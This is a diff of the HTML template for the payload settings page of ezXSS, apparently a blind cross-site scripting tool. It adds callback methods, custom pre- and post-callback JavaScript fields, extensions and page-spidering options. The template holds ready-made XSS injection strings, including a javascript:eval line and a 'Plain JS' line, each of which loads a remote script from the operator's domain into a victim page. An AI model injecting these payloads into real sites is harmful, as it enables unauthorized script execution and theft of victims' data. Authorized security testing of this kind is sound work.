@@ -10,7 +10,7 @@
                         <div class="header-title">
                             <h3 class="m-b-xs">Payload</h3>
                             <small>The payloads page lets you customize your payload settings, including extracting
-                                additional pages and managing white/blacklisted domains. Use it to edit what information
+                                additional pages and managing allow/deny listed domains. Use it to edit what information
                                 your payloads collect.</small>
                         </div>
                     </div>
@@ -22,19 +22,27 @@
 
             <div class="row">
                 <div class="col-lg-12">
-                    <select class="form-control content-select" id="payloadList" name="payloadList">
-                        {%foreach payload}
-                        <option value="{payload->id}" {payload->selected}>Payload #{payload->id} | {payload->name}
-                        </option>
-                        {%/foreach}
-                    </select>
+                    <div style="display: flex; gap: 10px;">
+                        <div style="flex: 1;">
+                            <select class="form-control content-select" id="payloadList" name="payloadList">
+                                {%foreach payload}
+                                <option value="{payload->id}" {payload->selected}>Payload #{payload->id} | {payload->name}
+                                </option>
+                                {%/foreach}
+                            </select>
+                        </div>
+                        {%if canCreatePayload}
+                        <div>
+                            <a href="/manage/payload/create" class="btn">Create new payload</a>
+                        </div>
+                        {%/if}
+                    </div>
                     <br>
                 </div>
 
                 <div class="col-lg-6">
-
                     <div class="panel panel-filled">
-                        <div class="panel-heading">Payloads</div>
+                        <div class="panel-heading">Payloads <a href="//{%data domain}/assets/payload-tester.html" target=_blank style="float:right">↗ tester</a></div>
                         <div class="panel-body payload-panel">
                             <div class="form-group">
                                 <label class="control-label">SCRIPT src</label><label class="shortboost"
@@ -84,37 +92,24 @@
 
                                 <label class="control-label">Create Element</label>
                                 <input class="form-control scriptsrc"
-                                    value="javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;//{%data domain}\&apos;;document.body.appendChild(a)&apos;)">
-                            </div>
-                        </div>
-                    </div>
+                                    value="javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;//{%data domain}\&apos;;document.body.appendChild(a)&apos;)"><br>
 
-                    <div class="panel panel-filled">
-                        <div class="panel-heading">Persistent mode</div>
-                        <div class="panel-body persistent-panel">
-                            <form class="form" id="persistent" method="post">
-                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
-                                <div class="form-group">
-                                    <label class="checkbox-label">
-                                        <input {%checked cPersistent} class="chkbox" id="persistent-mode"
-                                            name="persistent-mode" type="checkbox">
-                                        <span class="checkbox-custom rectangular"></span>
-                                    </label>
-                                    <p class="checkbox-text">Enable persistent mode [<a
-                                            href="https://github.com/ssl/ezXSS/wiki" target=_blank>?</a>]</p>
-                                    <button name="persistent" type="submit" class="btn">Save</button>
-                                </div>
-                            </form>
+                                <label class="control-label">Plain JS</label>
+                                <input class="form-control scriptsrc"
+                                    value="document.head.appendChild(Object.assign(document.createElement('script'),{src:'//{%data domain}'}));">
+                            </div>
                         </div>
                     </div>
                 </div>
 
                 <div class="col-lg-6">
                     <div class="panel panel-filled">
-                        <div class="panel-heading">Collecting</div>
+                        <div class="panel-heading">Settings</div>
                         <div class="panel-body">
                             <form class="form" id="collecting" method="post">
                                 <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+
+                                <label class="control-label">Collecting</label>
                                 <div class="row">
                                     <div class="col-lg-6">
                                         <div class="form-group">
@@ -181,27 +176,55 @@
                                         </div>
                                     </div>
                                 </div>
-                                <button name="collecting" type="submit" class="btn">Save</button>
-                            </form>
-                        </div>
-                    </div>
-
-                    <div class="panel panel-filled scn-payload-panel">
-                        <div class="panel-heading">Secondary Payload</div>
-                        <div class="panel-body">
-                            <form class="form" id="secondary-payload" method="post">
-                                <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
+                                
                                 <div class="form-group">
-                                    <label class="control-label" for="customjs">Custom javascript</label>
-                                    <textarea class="form-control" id="customjs" name="customjs"
-                                        rows=5>{%data customjs}</textarea>
+                                    <label class="control-label" for="method">Method [<a
+                                        href="https://github.com/ssl/ezXSS/wiki" target=_blank>?</a>]</label>
+                                    <select class="form-control" id="method" name="method">
+                                        <option value="1" {%data selectedMethod1}>Classic callback</option>
+                                        <option value="2" {%data selectedMethod2}>Persistent mode</option>
+                                    </select>
                                 </div>
-                                <button name="secondary-payload" type="submit" class="btn">Save</button>
+
+                                <div class="form-group">
+                                    <label class="control-label" for="extensions">Extensions</label>
+                                    <div class="extensions-dropdown">
+                                        <input type="hidden" name="extensions" id="extensions-hidden" value="">
+                                        <div class="extensions-display" id="extensions-display">
+                                            <div class="extensions-tags" id="extensions-tags">
+                                                
+                                            </div>
+                                            <div class="extensions-dropdown-btn" id="extensions-dropdown-btn">
+                                                <span class="dropdown-text">Select extensions...</span>
+                                                <span class="caret"></span>
+                                            </div>
+                                        </div>
+                                        <div class="extensions-dropdown-list" id="extensions-dropdown-list" style="display: none;">
+                                            {%foreach extensions}
+                                            <label class="extensions-option">
+                                                <input type="checkbox" value="{extensions->id}" {extensions->checked} data-name="{extensions->name}" data-description="{extensions->description}">
+                                                <span class="extensions-option-text">{extensions->name} - {extensions->description}</span>
+                                            </label>
+                                            {%/foreach}
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="control-label" for="customjs">Custom javascript pre-callback</label>
+                                    <textarea class="form-control" id="customjs" name="customjs" rows=4>{%data customjs}</textarea>
+                                </div>
+
+                                <div class="form-group">
+                                    <label class="control-label" for="customjs2">Custom javascript post-callback</label>
+                                    <textarea class="form-control" id="customjs2" name="customjs2" rows=4>{%data customjs2}</textarea>
+                                </div>
+
+                                <button name="settings" type="submit" class="btn">Save</button>
                             </form>
                         </div>
                     </div>
                 </div>
-
             </div>
 
             <div class="row">
@@ -215,9 +238,14 @@
                                     <label class="control-label" for="path">Add new path</label>
                                     <input class="form-control" id="path" name="path" placeholder="/robots.txt">
                                 </div>
-                                <button name="extract-pages" type="submit" class="btn">Save</button>
+                                <button name="extract-pages" type="submit" class="btn">Add</button>
+                                <p style="float:right"><select id="spider" name="spider" class="form-control">
+                                    <option value="0" {%data selectedSpider0}>No auto-spidering</option>
+                                    <option value="1" {%data selectedSpider1}>Spider w/ JS Web API</option>
+                                    <option value="2" {%data selectedSpider2}>Recursive spider w/ iFrame</option>
+                                </select></p>
                             </form>
-                            <hr>
+                            <hr class="list">
                             {%if hasPages}
                             <p><b>Pages:</b></p>
                             {%foreach pages}
@@ -238,7 +266,7 @@
 
                 <div class="col-lg-4">
                     <div class="panel panel-filled">
-                        <div class="panel-heading">Blocked domains (blacklist)</div>
+                        <div class="panel-heading">Denylisted domains</div>
                         <div class="panel-body">
                             <form class="form" id="blacklist-domains" method="post">
                                 <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
@@ -247,9 +275,9 @@
                                     <input class="form-control" id="blacklist-domain" name="domain"
                                         placeholder="example.com">
                                 </div>
-                                <button name="blacklist-domains" type="submit" class="btn">Save</button>
+                                <button name="blacklist-domains" type="submit" class="btn">Add</button>
                             </form>
-                            <hr>
+                            <hr class="list">
                             {%if hasBlacklist}
                             <p><b>Domains:</b></p>
                             {%foreach blacklist}
@@ -262,7 +290,7 @@
                             {%/if}
 
                             {%!if hasBlacklist}
-                            <p>There are no blacklisted domains yet for this payload.</p>
+                            <p>There are no domains yet for this payload.</p>
                             {%/!if}
 
                         </div>
@@ -271,7 +299,7 @@
 
                 <div class="col-lg-4">
                     <div class="panel panel-filled">
-                        <div class="panel-heading">Allowed only domains (whitelist)</div>
+                        <div class="panel-heading">Allowlisted domains</div>
                         <div class="panel-body">
                             <form class="form" id="whitelist-domains" method="post">
                                 <input type=hidden hidden name="csrf" value="{session[csrfToken]}">
@@ -280,9 +308,9 @@
                                     <input class="form-control" id="whitelist-domain" name="domain"
                                         placeholder="example.com">
                                 </div>
-                                <button name="whitelist-domains" type="submit" class="btn">Save</button>
+                                <button name="whitelist-domains" type="submit" class="btn">Add</button>
                             </form>
-                            <hr>
+                            <hr class="list">
                             {%if hasWhitelist}
                             <p><b>Domains:</b></p>
                             {%foreach whitelist}
@@ -295,13 +323,12 @@
                             {%/if}
 
                             {%!if hasWhitelist}
-                            <p>There are no whitelisted domains yet for this payload.</p>
+                            <p>There are no domains yet for this payload.</p>
                             {%/!if}
                         </div>
                     </div>
                 </div>
             </div>
-
         </div>
     </section>
 </div>
